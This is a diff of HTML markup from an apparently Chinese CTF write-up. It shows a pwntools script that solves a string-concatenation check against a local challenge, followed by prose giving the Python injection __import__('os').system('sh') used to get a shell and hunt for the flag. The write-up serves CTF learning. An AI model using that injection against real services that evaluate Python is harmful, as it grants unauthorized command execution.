@@ -4009,7 +4009,7 @@
 <hr />
 <h2 id="writeup">Writeup<a class="headerlink" href="#writeup" title="Permanent link">&para;</a></h2>
 <p>使用脚本直接打过去（当然也可以不用脚本直接手动完成，这可能是个非预期），完成字符串连接的题目进入 payload 环节：</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Python</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
 <span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
 <span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
 <span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
@@ -4023,22 +4023,22 @@
 <span class="normal"><a href="#__codelineno-0-12">12</a></span>
 <span class="normal"><a href="#__codelineno-0-13">13</a></span>
 <span class="normal"><a href="#__codelineno-0-14">14</a></span>
-<span class="normal"><a href="#__codelineno-0-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2"></a>
-<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">server_ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="n">server_port</span> <span class="o">=</span> <span class="mi">49871</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5"></a>
-<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="n">connection</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">server_ip</span><span class="p">,</span> <span class="n">server_port</span><span class="p">)</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7"></a>
-<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="n">received_data</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="n">send_data</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="o">-</span><span class="mi">32</span><span class="p">:</span><span class="o">-</span><span class="mi">26</span><span class="p">]</span> <span class="o">+</span> <span class="n">received_data</span><span class="p">[</span><span class="o">-</span><span class="mi">23</span><span class="p">:</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
-<a id="__codelineno-0-10" name="__codelineno-0-10"></a>
-<a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
-<a id="__codelineno-0-12" name="__codelineno-0-12"></a>
-<a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">send_data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-<a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="n">connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div></td></tr></table></div>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">server_ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="n">server_port</span> <span class="o">=</span> <span class="mi">49871</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="n">connection</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">server_ip</span><span class="p">,</span> <span class="n">server_port</span><span class="p">)</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="n">received_data</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="n">send_data</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="o">-</span><span class="mi">32</span><span class="p">:</span><span class="o">-</span><span class="mi">26</span><span class="p">]</span> <span class="o">+</span> <span class="n">received_data</span><span class="p">[</span><span class="o">-</span><span class="mi">23</span><span class="p">:</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="nb">print</span><span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">send_data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="n">connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
 <p>对于这类题目，我们直接执行攻入终端代码：<code>__import__('os').system('sh')</code>，命令行 <code>ls</code> 即可发现文件信息：</p>
 <p><img alt="" src="../../../../../assets/Pasted%20image%2020241025234220.png" /></p>
 <p>经过一番寻找，发现有关 flag 位置的文件：</p>
